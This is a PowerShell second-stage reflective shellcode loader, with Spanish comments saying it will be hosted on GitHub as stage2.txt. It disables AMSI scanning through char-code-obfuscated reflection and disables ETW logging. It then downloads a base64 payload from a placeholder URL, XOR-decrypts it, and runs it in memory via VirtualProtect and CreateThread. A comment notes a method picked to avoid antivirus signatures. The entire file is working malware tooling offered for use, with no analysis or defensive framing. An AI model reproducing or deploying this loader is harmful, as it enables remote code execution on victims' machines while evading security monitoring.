# Stage 2 - Reflective Loader (se subirá como stage2.txt a GitHub)
# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+[char]109+[char]115+[char]105)+$([char]85+[char]116+[char]105+[char]108+[char]115))).GetField($([char]97+[char]109+[char]115+[char]105)+$([char]73+[char]110+[char]105+[char]116)+$([char]70+[char]97+[char]105+[char]108+[char]101+[char]100),'NonPublic,Static').SetValue($null,$true)

# ETW Bypass
$a=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
if($a){$b=$a.GetField('etwProvider','NonPublic,Static');if($b){$b.SetValue($null,0)}}

# Config
$pu='PAYLOAD_URL_HERE'
$xk='XOR_KEY_HERE'

# Download + Decrypt
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0')
$e=$wc.DownloadString($pu)
$rb=[Convert]::FromBase64String($e)
$kb=[Text.Encoding]::UTF8.GetBytes($xk)
$d=New-Object byte[] $rb.Length
for($i=0;$i -lt $rb.Length;$i++){$d[$i]=$rb[$i] -bxor $kb[$i%$kb.Length]}
$rb=$null

# Exec with Marshal (menos firma que VirtualAlloc)
$c=@'
[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,out IntPtr f);
[DllImport("kernel32")]public static extern uint WaitForSingleObject(IntPtr a,uint b);
[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr b,uint c,out uint d);
'@
$w=Add-Type -M $c -Name W -Namespace W -PassThru
$m=[Runtime.InteropServices.Marshal]::AllocHGlobal($d.Length)
[Runtime.InteropServices.Marshal]::Copy($d,0,$m,$d.Length)
$o=0;$w::VirtualProtect($m,[UIntPtr]::new($d.Length),0x20,[ref]$o)|Out-Null
$ti=[IntPtr]::Zero;$th=$w::CreateThread(0,0,$m,0,0,[ref]$ti)
$w::WaitForSingleObject($th,0xFFFFFFFF)|Out-Null
